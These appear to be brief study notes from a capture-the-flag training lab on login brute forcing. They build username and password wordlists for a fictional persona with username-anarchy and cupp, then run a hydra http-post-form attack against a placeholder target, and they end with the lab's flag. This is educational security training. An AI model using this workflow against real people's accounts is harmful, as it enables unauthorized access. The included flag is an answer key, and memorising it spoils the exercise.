# Module 57 — Login Brute Forcing
## Section: Custom Wordlists

**Profile given:** "Jane Smith" at company "AHI"

**Steps:**
1. Generate candidate usernames: `username-anarchy "Jane" "Smith"` → 14 candidates → `jane_smith_usernames.txt`
2. Generate candidate passwords from OSINT/persona clues: `cupp -i` (interactive profiling tool) → large list, then filtered by the site's stated password-policy (grep) → `jane.txt` / `jane-filtered.txt`
3. Brute force: `hydra -L jane_smith_usernames.txt -P jane-filtered.txt <target> http-post-form "<form-path>:<form-params>:<fail-string>"`

**Flag:** `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}`
